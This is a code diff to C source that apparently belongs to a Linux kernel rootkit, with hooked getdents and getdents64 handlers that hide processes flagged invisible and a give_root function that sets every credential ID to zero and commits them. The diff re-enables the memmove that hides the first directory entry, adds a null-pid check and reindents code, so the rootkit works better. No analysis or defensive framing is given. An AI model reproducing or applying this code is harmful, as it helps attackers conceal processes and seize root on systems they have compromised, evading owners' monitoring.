@@ -50,7 +50,10 @@ find_task(pid_t pid)
 int
 is_invisible(pid_t pid)
 {
-	struct task_struct *task = find_task(pid);
+	struct task_struct *task;
+	if (!pid)
+		return 0;
+	task = find_task(pid);
 	if (!task)
 		return 0;
 	if (task->flags & PF_INVISIBLE)
@@ -93,13 +96,13 @@ hacked_getdents64(unsigned int fd, struct linux_dirent64 __user *dirent,
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
-//				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				memmove(dir, (void *)dir + dir->d_reclen, ret);
 				dir = (void *)dir + dir->d_reclen;
 				continue;
 			}
 			prev->d_reclen += dir->d_reclen;
 		} else
-		prev = dir;
+			prev = dir;
 		off += dir->d_reclen;
 	}
 	err = copy_to_user(dirent, kdirent, ret);
@@ -145,7 +148,7 @@ hacked_getdents(unsigned int fd, struct linux_dirent __user *dirent,
 		is_invisible(simple_strtoul(dir->d_name, NULL, 10)))) {
 			if (dir == kdirent) {
 				ret -= dir->d_reclen;
-//				memmove(dir, (void *)dir + dir->d_reclen, ret);
+				memmove(dir, (void *)dir + dir->d_reclen, ret);
 				dir = (void *)dir + dir->d_reclen;
 				continue;
 			}
@@ -170,15 +173,15 @@ give_root(void)
 	if (newcreds == NULL)
 		return;	
 	#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 5, 0)
-	newcreds->uid = newcreds->gid = 0;
-	newcreds->euid = newcreds->egid = 0;
-	newcreds->suid = newcreds->sgid = 0;
-	newcreds->fsuid = newcreds->fsgid = 0;
+		newcreds->uid = newcreds->gid = 0;
+		newcreds->euid = newcreds->egid = 0;
+		newcreds->suid = newcreds->sgid = 0;
+		newcreds->fsuid = newcreds->fsgid = 0;
 	#else
-	newcreds->uid.val = newcreds->gid.val = 0;
-	newcreds->euid.val = newcreds->egid.val = 0;
-	newcreds->suid.val = newcreds->sgid.val = 0;
-	newcreds->fsuid.val = newcreds->fsgid.val = 0;
+		newcreds->uid.val = newcreds->gid.val = 0;
+		newcreds->euid.val = newcreds->egid.val = 0;
+		newcreds->suid.val = newcreds->sgid.val = 0;
+		newcreds->fsuid.val = newcreds->fsgid.val = 0;
 	#endif
 	commit_creds(newcreds);
 }
